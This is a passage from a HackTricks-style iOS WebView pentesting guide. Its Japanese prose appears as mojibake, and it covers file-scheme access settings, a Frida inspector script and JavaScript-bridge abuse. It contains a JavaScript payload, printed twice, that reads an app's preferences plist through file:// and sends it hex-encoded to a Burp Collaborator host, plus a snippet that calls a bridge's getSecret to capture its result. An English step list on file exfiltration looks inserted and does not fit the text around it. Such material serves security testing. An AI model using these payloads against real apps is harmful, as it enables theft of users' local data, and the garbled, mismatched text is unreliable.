ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒã‚ã‚‹å ´åˆã¯ã€ã“ã‚Œã‚‰ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸ** **ãƒã‚¤ãƒŠãƒª**ãŒã‚ã‚‹å ´åˆã¯ã€æ¬¡ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ã‚¯ã‚»ã‚¹

* **UIWebView:**
* `file://` ã‚¹ã‚­ãƒ¼ãƒ ã¯å¸¸ã«æœ‰åŠ¹ã§ã™ã€‚
* `file://` URL ã‹ã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ã‚¯ã‚»ã‚¹ã¯å¸¸ã«æœ‰åŠ¹ã§ã™ã€‚
* `file://` URL ã‹ã‚‰ã®ãƒ¦ãƒ‹ãƒãƒ¼ã‚µãƒ«ã‚¢ã‚¯ã‚»ã‚¹ã¯å¸¸ã«æœ‰åŠ¹ã§ã™ã€‚
* `baseURL` ã‚‚ `nil` ã«è¨­å®šã•ã‚ŒãŸ `UIWebView` ã‹ã‚‰æœ‰åŠ¹ãªã‚ªãƒªã‚¸ãƒ³ã‚’å–å¾—ã™ã‚‹ã¨ã€"null" ã§ã¯ãªãã€æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ãŒå¾—ã‚‰ã‚Œã¾ã™: `applewebdata://5361016c-f4a0-4305-816b-65411fc1d78`0ã€‚ã“ã®ã‚ªãƒªã‚¸ãƒ³ "applewebdata://" ã¯ "file://" ã‚ªãƒªã‚¸ãƒ³ã¨ä¼¼ã¦ãŠã‚Šã€**åŒä¸€ã‚ªãƒªã‚¸ãƒ³ãƒãƒªã‚·ãƒ¼ã‚’å®Ÿè£…ã—ã¦ã„ãªã„**ãŸã‚ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ä»»æ„ã®ã‚¦ã‚§ãƒ–ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã¾ã™ã€‚

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**ï¼ˆWKWebViewï¼‰ï¼š
* **`allowFileAccessFromFileURLs`**ï¼ˆ`WKPreferences`ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`false`ï¼‰ï¼šã“ã‚Œã«ã‚ˆã‚Šã€`file://`ã‚¹ã‚­ãƒ¼ãƒ URLã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§å®Ÿè¡Œã•ã‚Œã‚‹JavaScriptãŒä»–ã®`file://`ã‚¹ã‚­ãƒ¼ãƒ URLã‹ã‚‰ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
* **`allowUniversalAccessFromFileURLs`**ï¼ˆ`WKWebViewConfiguration`ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`false`ï¼‰ï¼šã“ã‚Œã«ã‚ˆã‚Šã€`file://`ã‚¹ã‚­ãƒ¼ãƒ URLã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§å®Ÿè¡Œã•ã‚Œã‚‹JavaScriptãŒä»»æ„ã®ã‚ªãƒªã‚¸ãƒ³ã‹ã‚‰ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

ã“ã‚Œã‚‰ã®é–¢æ•°ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚„ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸãƒã‚¤ãƒŠãƒªã§æ¤œç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã¾ãŸã€æ¬¡ã®Fridaã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€ã“ã®æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™

To exfiltrate arbitrary files from an iOS app's webview, you can use the following steps:

1. Identify the webview's file upload functionality.
2. Craft a malicious file that contains the data you want to exfiltrate.
3. Use a file upload vulnerability to upload the malicious file to the webview.
4. Intercept the file upload request using a proxy tool like Burp Suite.
5. Modify the request to exfiltrate the file to an external server or storage.
6. Verify that the file has been successfully exfiltrated.

Note: This technique may require additional steps depending on the specific app and its security measures.
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## WebViewã‚’ä»‹ã—ãŸå…¬é–‹ã•ã‚ŒãŸãƒã‚¤ãƒ†ã‚£ãƒ–ãƒ¡ã‚½ãƒƒãƒ‰

iOS 7ä»¥é™ã€Appleã¯WebViewå†…ã®JavaScriptãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã¨ãƒã‚¤ãƒ†ã‚£ãƒ–ã®Swiftã¾ãŸã¯Objective-Cã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆé–“ã®é€šä¿¡ã‚’å¯èƒ½ã«ã™ã‚‹APIã‚’å°å…¥ã—ã¾ã—ãŸã€‚

ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚³ãƒ¼ãƒ‰ã¨JavaScriptã®é€šä¿¡æ–¹æ³•ã«ã¯ã€æ¬¡ã®2ã¤ã®åŸºæœ¬çš„ãªæ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

* **JSContext**: Objective-Cã¾ãŸã¯Swiftã®ãƒ–ãƒ­ãƒƒã‚¯ãŒ`JSContext`ã®è­˜åˆ¥å­ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚Œã‚‹ã¨ã€JavaScriptCoreã¯è‡ªå‹•çš„ã«ãƒ–ãƒ­ãƒƒã‚¯ã‚’JavaScripté–¢æ•°ã§ãƒ©ãƒƒãƒ—ã—ã¾ã™ã€‚
* **JSExportãƒ—ãƒ­ãƒˆã‚³ãƒ«**: `JSExport`ã‚’ç¶™æ‰¿ã—ãŸãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§å®£è¨€ã•ã‚ŒãŸãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãƒ¡ã‚½ãƒƒãƒ‰ã€ã‚¯ãƒ©ã‚¹ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€ã™ã¹ã¦ã®JavaScriptã‚³ãƒ¼ãƒ‰ã§åˆ©ç”¨å¯èƒ½ãªJavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ãƒãƒƒãƒ”ãƒ³ã‚°ã•ã‚Œã¾ã™ã€‚JavaScriptç’°å¢ƒå†…ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å¤‰æ›´ã¯ã€ãƒã‚¤ãƒ†ã‚£ãƒ–ç’°å¢ƒã«åæ˜ ã•ã‚Œã¾ã™ã€‚

æ³¨æ„ç‚¹ã¨ã—ã¦ã€**`JSExport`ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§å®šç¾©ã•ã‚ŒãŸã‚¯ãƒ©ã‚¹ãƒ¡ãƒ³ãƒãƒ¼ã®ã¿**ãŒJavaScriptã‚³ãƒ¼ãƒ‰ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚\
WebViewã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸ`JSContext`ã«ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒãƒƒãƒ”ãƒ³ã‚°ã™ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’æ¢ã—ã€å…¬é–‹ã•ã‚Œã‚‹æ©Ÿèƒ½ã‚’åˆ†æã—ã¦ãã ã•ã„ã€‚ä¾‹ãˆã°ã€æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã¯WebViewã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§å…¬é–‹ã•ã‚Œã‚‹ã¹ãã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚\
Objective-Cã§ã¯ã€`UIWebView`ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸ`JSContext`ã¯æ¬¡ã®ã‚ˆã†ã«å–å¾—ã•ã‚Œã¾ã™ï¼š
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
**`WKWebView`å†…ã®JavaScriptã‚³ãƒ¼ãƒ‰ã¯ã€ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚¢ãƒ—ãƒªã«ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€`UIWebView`ã¨ã¯ç•°ãªã‚Šã€`WKWebView`ã®`JSContext`ã‚’ç›´æ¥å‚ç…§ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚ä»£ã‚ã‚Šã«ã€ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã¨`postMessage`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦é€šä¿¡ã‚’å®Ÿè£…ã—ã¾ã™ã€‚ã“ã®é–¢æ•°ã¯ã€JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒã‚¤ãƒ†ã‚£ãƒ–ã®Objective-Cã¾ãŸã¯Swiftã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«è‡ªå‹•çš„ã«ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ã¾ã™ã€‚ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒãƒ³ãƒ‰ãƒ©ã¯ã€[`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add)ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦æ§‹æˆã•ã‚Œã¾ã™ã€‚

### JavaScriptBridgeã®æœ‰åŠ¹åŒ–
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®é€ä¿¡

åå‰ãŒã€Œ"name"ã€ï¼ˆã¾ãŸã¯ä¸Šè¨˜ã®ä¾‹ã§ã¯ã€Œ"javaScriptBridge"ã€ï¼‰ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒãƒ³ãƒ‰ãƒ©ã‚’è¿½åŠ ã™ã‚‹ã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã‚’ä½¿ç”¨ã™ã‚‹ã™ã¹ã¦ã®ã‚¦ã‚§ãƒ–ãƒ“ãƒ¥ãƒ¼ã®ã™ã¹ã¦ã®ãƒ•ãƒ¬ãƒ¼ãƒ ã«ã€JavaScripté–¢æ•°`window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage`ãŒå®šç¾©ã•ã‚Œã¾ã™ã€‚ãã‚Œã¯[æ¬¡ã®ã‚ˆã†ã«HTMLãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33)ã€‚
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
ãƒã‚¤ãƒ†ã‚£ãƒ–é–¢æ•°ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ã€é€šå¸¸ã¯**ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸å†…ã§ã„ãã¤ã‹ã®JavaScriptãŒå®Ÿè¡Œã•ã‚Œã¾ã™**ï¼ˆä»¥ä¸‹ã®`evaluateJavascript`ã‚’å‚ç…§ï¼‰ã€‚å®Ÿè¡Œã•ã‚Œã‚‹é–¢æ•°ã‚’**ä¸Šæ›¸ãã—ã¦çµæœã‚’ç›—ã‚€**ã“ã¨ã«èˆˆå‘³ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
ä¾‹ãˆã°ã€ä»¥ä¸‹ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã¯ã€é–¢æ•°**`javascriptBridgeCallBack`**ãŒ2ã¤ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆå‘¼ã³å‡ºã•ã‚ŒãŸé–¢æ•°ã¨**çµæœ**ï¼‰ã¨å…±ã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹HTMLã‚’åˆ¶å¾¡ã§ãã‚‹å ´åˆã€çµæœã‚’å«ã‚€**ã‚¢ãƒ©ãƒ¼ãƒˆã‚’ä½œæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
### å‘¼ã³å‡ºã•ã‚Œã‚‹é–¢æ•°

å‘¼ã³å‡ºã•ã‚Œã‚‹é–¢æ•°ã¯[`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29)ã«ã‚ã‚Šã¾ã™ã€‚
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### ãƒ†ã‚¹ãƒˆ

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã§postMessageã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«ã¯ã€æ¬¡ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

- ã‚µãƒ¼ãƒãƒ¼ã®å¿œç­”ã‚’å¤‰æ›´ã™ã‚‹ï¼ˆMitMï¼‰
- Fridaãªã©ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ç”¨ã—ã¦å‹•çš„ãªã‚¤ãƒ³ã‚¹ãƒˆãƒ«ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ã€iOSã®WebViewsç”¨ã«åˆ©ç”¨å¯èƒ½ãªå¯¾å¿œã™ã‚‹JavaScriptè©•ä¾¡é–¢æ•°ï¼ˆ`UIWebView`ã®[`stringByEvaluatingJavaScriptFromStringï¼š`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc)ãŠã‚ˆã³`WKWebView`ã®[`evaluateJavaScriptï¼šcompletionHandlerï¼š`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc)ï¼‰ã‚’ä½¿ç”¨ã—ã¦JavaScriptãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹ã€‚

## iOS WebViewsã®ãƒ‡ãƒãƒƒã‚°

ï¼ˆ[https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews)ã‹ã‚‰ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ï¼‰

iOSã®WebViewsã§ã¯ã€`console.log()`ã«æ¸¡ã•ã‚ŒãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯Xcodeã®ãƒ­ã‚°ã«ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚Safariã®é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦Webã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ãƒ‡ãƒãƒƒã‚°ã™ã‚‹ã“ã¨ã¯ã¾ã æ¯”è¼ƒçš„ç°¡å˜ã§ã™ãŒã€ã„ãã¤ã‹ã®åˆ¶é™ãŒã‚ã‚Šã¾ã™ã€‚

- iOSã®WebViewsã®ãƒ‡ãƒãƒƒã‚°ã«ã¯SafariãŒå¿…è¦ãªãŸã‚ã€é–‹ç™ºç”¨ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã¯macOSã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
- App Storeã‚„Apple Configuratorã‚’ä»‹ã—ã¦ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã§ã¯ã€WebViewsã®ãƒ‡ãƒãƒƒã‚°ã¯ã§ãã¾ã›ã‚“ã€‚

ã“ã‚Œã‚‰ã®åˆ¶é™ã‚’è€ƒæ…®ã—ã¦ã€iOSã®WebViewsã‚’ãƒªãƒ¢ãƒ¼ãƒˆã§ãƒ‡ãƒãƒƒã‚°ã™ã‚‹æ‰‹é †ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ã€‚

- ã¾ãšã€iOSãƒ‡ãƒã‚¤ã‚¹ã§Safari Web Inspectorã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã«ã€iOSã®ã€Œè¨­å®šã€ã‚¢ãƒ—ãƒªã‚’é–‹ãã€ã€Œè¨­å®š > Safari > è©³ç´°è¨­å®šã€ã«ç§»å‹•ã—ã€ã€ŒWeb Inspectorã€ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ã‚ªãƒ³ã«ã—ã¾ã™ã€‚

![iOS Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

- æ¬¡ã«ã€é–‹ç™ºç”¨ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã§Safariã®é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã‚‚æœ‰åŠ¹ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚é–‹ç™ºç”¨ã®ãƒã‚·ãƒ³ã§Safariã‚’èµ·å‹•ã—ã€ãƒ¡ãƒ‹ãƒ¥ãƒ¼ãƒãƒ¼ã®ã€ŒSafari > ç’°å¢ƒè¨­å®šã€ã«ç§»å‹•ã—ã¾ã™ã€‚è¡¨ç¤ºã•ã‚Œã‚‹ç’°å¢ƒè¨­å®šãƒ‘ãƒãƒ«ã§ã€ã€Œè©³ç´°ã€ã‚¿ãƒ–ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã€ä¸€ç•ªä¸‹ã«ã‚ã‚‹ã€Œé–‹ç™ºãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚’è¡¨ç¤ºã€ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æœ‰åŠ¹ã«ã—ã¾ã™ã€‚ã“ã‚Œã‚’è¡Œã£ãŸå¾Œã€ç’°å¢ƒè¨­å®šãƒ‘ãƒãƒ«ã‚’é–‰ã˜ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![Mac Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

- iOSãƒ‡ãƒã‚¤ã‚¹ã‚’é–‹ç™ºç”¨ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã«æ¥ç¶šã—ã€ã‚¢ãƒ—ãƒªã‚’èµ·å‹•ã—ã¾ã™ã€‚
- é–‹ç™ºç”¨ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã®Safariã§ã€ãƒ¡ãƒ‹ãƒ¥ãƒ¼ãƒãƒ¼ã®ã€Œé–‹ç™ºã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã€iOSãƒ‡ãƒã‚¤ã‚¹ã®åå‰ã§ã‚ã‚‹ãƒ‰ãƒ­ãƒƒãƒ—ãƒ€ã‚¦ãƒ³ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã«ã‚«ãƒ¼ã‚½ãƒ«ã‚’åˆã‚ã›ã‚‹ã¨ã€iOSãƒ‡ãƒã‚¤ã‚¹ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹Webviewã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒªã‚¹ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

![Mac Safari develop menu](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

- ãƒ‡ãƒãƒƒã‚°ã—ãŸã„Webviewã®ãƒ‰ãƒ­ãƒƒãƒ—ãƒ€ã‚¦ãƒ³ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€Webviewã‚’æ¤œæŸ»ã™ã‚‹ãŸã‚ã®æ–°ã—ã„Safari Web Inspectorã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒé–‹ãã¾ã™ã€‚

![Safari Web Inspector window](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## å‚è€ƒæ–‡çŒ®

- [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
- [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚„HackTricksã®PDFã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„**ã€‚

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksã®ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudã®ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„**ã€‚

</details>
